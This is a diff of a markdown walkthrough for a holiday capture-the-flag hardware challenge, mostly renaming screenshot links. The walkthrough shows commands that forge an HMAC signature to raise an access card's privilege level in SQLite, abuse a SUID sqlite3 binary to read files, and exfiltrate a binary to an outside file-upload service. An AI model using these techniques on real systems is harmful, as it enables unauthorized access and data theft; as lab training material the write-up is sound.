@@ -1,11 +1,15 @@
 ## Objectives
 
-![](../../../Assets/images/act1/hardware-part-1/Pasted%20image%2020241125200143.png)
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241125200203.png)
+![](../../../Assets/images/act1/hardware-part-1/act1-hardware-part-1-top-level-objective.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-objective.png)
 ## Hints
-![](../../../Assets/images/act1/hardware-part-2/{04868BAA-9E08-405E-9A53-28CF55B32BD2}.png)
-![](../../../Assets/images/act1/hardware-part-2/{E27FDB9E-D2D1-4564-A9FB-E11807FEC646}.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-hint-itss-in-the-signature.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-hint-hidden-in-plain-sight.png)
 ## Solution
+
+> [!TIP] 
+> If your the type that wants to know how the executables work before you start, I recommend that you jump to the [UBoot](#Steps%20(U-Boot)) section which you can use to extract the binaries and take a look at the contents. Otherwise recommend reviewing the supporting analysis [Main In-depth Analysis](../../../Supporting/act1/hardware-part-2/Main%20In-depth%20Analysis.md) and [SLH in-depth Analysis](../../../Supporting/act1/hardware-part-2/SLH%20in-depth%20Analysis.md)
+
 ![act1-hardware-part-2-inital-boot-screen.png](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-inital-boot-screen.png)
 ### Silver (SLH)
 - Initial boot
@@ -59,37 +63,37 @@ Details of card with ID: 143
 Card 42 granted access level 1.
 ```
 
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241125200039.png)
+![](../../../Assets/images/act1/hardware-part-2/act-hardware-part-2-achivement-silver.png)
 ### Steps  (Gold)
 - Connect to the SQLite Database Service
 ```bash
 sqlite3
 ```
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241126130133.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-sqlite3-loading.png)
 - open the database access_cards that we can see from the directory we boot into
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241126130157.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-sqlite3-open-database.png)
 ```bash
 .open access_cards
 ```
 
 - Determine the table structure
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241126130222.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-sqlite3-see-table-format.png)
 ```sql
 PRAGMA table_info(access_cards);
 ```
 
 - Get the access details for Access Card 42
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241126130300.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-sqlite3-access-and-uuid-card-42.png)
 > [!NOTE]
 > I was able to skip a step here because I know that the HMAC is comprised of the UUID, and the access level, so those are the two components that I pulled. This can be asertained by looking at the config, but will refer back to this when creating the actual contents
-> ![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241126130324.png)
+> ![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-sqlite3-config-selector.png)
 
 ```sql
 select uuid, access FROM access_cards where ID=42;
 ```
 
 - Now we need to update the permissions of this card by creating a new signature and an SQL update command. So we have to identify the format, which can be seen by the config information
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241126130331.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-sqlite3-config-table-contents.png)
 
 ```sql
 SELECT * FROM config;
@@ -97,20 +101,20 @@ SELECT * FROM config;
 
 - With this knowledge we can take the `{access-level}{uuid}` to create the HMAC needed to escalate the privileges , but we need to make use of that `hmac_secret` 
 
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241126130456.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-hmac-signature-creation-cyberchef.png)
 
 ```recipe
 HMAC(%7B'option':'UTF8','string':'9ed1515819dec61fd361d5fdabb57f41ecce1a5fe1fe263b98c0d6943b9b232e'%7D,'SHA256')&input=MWMwNjAxOGI2LTVlODAtNDM5NS1hYjcxLWFlNTEyNDU2MDE4OQ
 ```
 
 - Now we can use that signed HMAC value to update access card 42
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241126130530.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-signed-hmac-signature.png)
 
 ```sql
 UPDATE access_cards SET access = 1, sig = '135a32d5026c5628b1753e6c67015c0f04e26051ef7391c2552de2816b1b7096' WHERE id = 42;
 ```
 
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241125200101.png)
+![](../../../Assets/images/act1/hardware-part-2/act-hardware-part-2-achievement-gold.png)
 ### Solution (Gold Alternative)
 #### Using The Shell For Database
 - Run `/usr/bin/sqlite3` as identified in [SUID Binary Listing](#find%20/%20-perm%20-u=s%20-type%20f%202>/dev/null) by passing in the file to read ([Reference](https://gtfobins.github.io/gtfobins/sqlite3/))
@@ -123,12 +127,12 @@ SELECT * FROM t;
 EOF
 ```
 
-![acti-hardware-part-2-console-sqllite-read-yaml-runtoanswer.png](../../../Assets/images/act1/hardware-part-2/act-1-hardware-part-2-console-sqllite-read-yaml-runtoanswer.png)
-![acti-hardware-part-2-console-sqllite-read-hard-runtoanswer.png](../../../Assets/images/act1/hardware-part-2/act-1-hardware-part-2-console-sqllite-read-hard-runtoanswer.png)
+![acti-hardware-part-2-console-sqllite-read-yaml-runtoanswer.png](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-console-sqllite-read-yaml-runtoanswer.png)
+![acti-hardware-part-2-console-sqllite-read-hard-runtoanswer.png](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-console-sqllite-read-hard-runtoanswer.png)
 #### Answer Questions
-![acti-hardware-part-2-console-ls-runtoanswer-binary-config.png](../../../Assets/images/act1/hardware-part-2/act-1-hardware-part-2-console-ls-runtoanswer-binary-config.png)
-![acti-hardware-part-2-console-sqllite-runtoanswer-easy.png](../../../Assets/images/act1/hardware-part-2/act-1-hardware-part-2-console-sqllite-runtoanswer-easy.png)
-![acti-hardware-part-2-console-sqllite-runtoanswer-hard.png](../../../Assets/images/act1/hardware-part-2/act-1-hardware-part-2-console-sqllite-runtoanswer-hard.png)
+![acti-hardware-part-2-console-ls-runtoanswer-binary-config.png](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-console-ls-runtoanswer-binary-config.png)
+![acti-hardware-part-2-console-sqllite-runtoanswer-easy.png](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-console-sqllite-runtoanswer-easy.png)
+![acti-hardware-part-2-console-sqllite-runtoanswer-hard.png](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-console-sqllite-runtoanswer-hard.png)
 
 ## Additional Enumeration/Reconnaissance Information
 
@@ -265,19 +269,22 @@ find / -perm -u=s -type f 2>/dev/null
 /usr/local/sbin/runtoanswer
 ```
 ### Steps (U-Boot)
+> [!CAUTION] 
+> This is a giant rabbit hole as this proves to be nothing important, but tests the assumption that this UBoot Loader is entirely fake and is not part of the actual solution
+
 ![SANS 2024 Holiday CTF/Assets/images/act1/hardware-part-2/act1-hardware-part-2-u-boot-console.png](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-u-boot-console.png)
 ![SANS 2024 Holiday CTF/Assets/images/act1/hardware-part-2/act1-hardware-part-2-u-boot-help.png](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-u-boot-help.png)
 ![act1-hardware-part-2-u-boot-bdinfo.png](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-u-boot-bdinfo.png)
 ![SANS 2024 Holiday CTF/Assets/images/act1/hardware-part-2/act1-hardware-part-2-u-boot-connection-info.png](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-u-boot-connection-info.png)
 ![act1-hardware-part-2-u-boot-version.png](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-u-boot-version.png)
 ![act1-hardware-part-2-u-boot-base-and-tftp-boot.png](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-u-boot-base-and-tftp-boot.png)
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241126132241.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-u-boot-sucessful-launch.png)
 #### Maybe There is Something?
 > [!NOTE]
 > If we make some basic assumptions here, such as this is a container, intended for solving a challenge, then there is like an entrypoint somewhere that kicks off the activity in the container
 
 - Changed to the root of the SLH system to see how the uboot is setup for entry. Found an `etnrypoint.sh`
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241126132334.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-entrypoint.sh-for-slh.png)
  /entrypoint.sh
 ```bash
 #!/bin/bash
@@ -299,9 +306,9 @@ wait $HMAC_PID
 >This script shows the `check_hmac` running in the background, and the main `slh` application being used through the `/usr/bin/main` console
 
 - Since this script launches the `/usr/bin/main` we should examine that bin folder and see what is there and what we can extract
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241126132908.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-list-of-usr-binaries.png)
 - Looking around here, there is no common utils for reverse shells, such as NetCat, Curl, WGet, or Secure Copy, but there appears to be python3. So maybe we can create a exporter that way. First we need a server to listen to to received this data. I have opt'd to use an upload file service `gofile.io`
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241126151830.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-gofile-io-api-implmentation.png)
 - With that server allowing an update, we create a client in python3 that can take the binary file send it to an upload. 
 >[!NOTE]
 >You don't have access to requests module, so we have to use Urllib instead to allow for the upload to occur
@@ -620,9 +627,9 @@ if __name__ == '__main__':
 ```
 
 - we can upload this to the slhconsole by adding `cat << 'EOF' > upload_file.py` and `EOF` at the end which would save it to the system:
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241126152454.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-ls-verification-of-upload-script.png)
 - attempt to upload the file via `python3 upload_file.py upload --zone na /usr/bin/main`
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241126193653.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-custom-exfil-script.png)
 - After the upload is complete we get a link that we can copy which contains the file: https://gofile.io/d/xvBRIx
 >[!NOTE] 
 >This link likely will not be active at the time of release of this walkthrough, but is accessible via the files folder here: [main (ELF Binary)](../../../Assets/files/act1/hardware-part-2/main)
@@ -630,20 +637,20 @@ if __name__ == '__main__':
 ```bash
 strings main | grep python
 ```
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241126194515.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-u-boot-strings.png)
 - Ok so we know this is a binary, and we know it has references to the python shared libraries, so this was likely a python project that has been complied into a binary through a third party tool like `PyInstaller`. Under this assumption, we can try to unpack this via [PyInsxtractor](../../../Assets/code/act1/hardware-part1/pyinstxtractor.py) ([extremecoders-re/pyinstxtractor: PyInstaller Extractor](https://github.com/extremecoders-re/pyinstxtractor)) 
 ```bash
 python3 ./pyinsxtractor.py main
 ```
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241126195317.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-main-extracting-installer.png)
 - With this we are able to see that we have compiled python files (pyc) which needs to be decoded. There are several ways, but an easy one to do this with is online ([python decompiler online - Google Search](https://www.google.com/search?q=python+decompiler+online)) -- Any of which should work. Using the first option available `PyLingual` -  https://pylingual.io/, is what I did.
 - Need to determine what file to decompile though. If we look at the extracted files from the extractor we see 
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241126195646.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-uboot-main-application-extracted.png)
 - But the `pyc` files are what we really care about here to see what is happening. lets filter that with 
 ```bash
 ls | grep .pyc
 ```
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241126195806.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-main-application-strings.png)
 - So these are the files we need to decode:
 	- [main.pyc_decompiled.py](../../../Assets/files/act1/hardware-part-2/main_extracted/main.pyc_decompiled.py)
 	- [pyi_rth_inspect.pyc_decompiled.py](../../../Assets/files/act1/hardware-part-2/main_extracted/pyi_rth_inspect.pyc_decompiled.py)
@@ -664,11 +671,11 @@ setenv netmask 255.255.255.0
 setenv serverip 192.168.54.32 
 setenv bootfile backup.img
 ```
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241126213343.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-uboot-set-environment-variables.png)
 - Result would be verified through `printenv`
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241126213433.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-uboot-printenv.png)
 - If we launch the TFTP server based on this config we would get the following output
-![](../../../Assets/images/act1/hardware-part-2/Pasted%20image%2020241126213554.png)
+![](../../../Assets/images/act1/hardware-part-2/act1-hardware-part-2-slh-after-uboot-success.png)
 - which is odd, as we know that the bootfile is not `C0A80101.img`, we had already set it to `boot.img`. The second thing to note here is when that loaded via the filename option, this loaded the SLH application, which is the normal boot section.
 	- If we look at the placements of tokens claimed by the system `/tmp/tokens` and `/usr/share/stuff/tokens` neither of the files or directories exist on the system, meaning that we can not view those potential credentials
 - based on this we can pretty much assume that this is not an actual viable method and only a distraction. Refer to [Main In-depth Analysis](../../../Supporting/act1/hardware-part-2/Main%20In-depth%20Analysis.md) for more details.
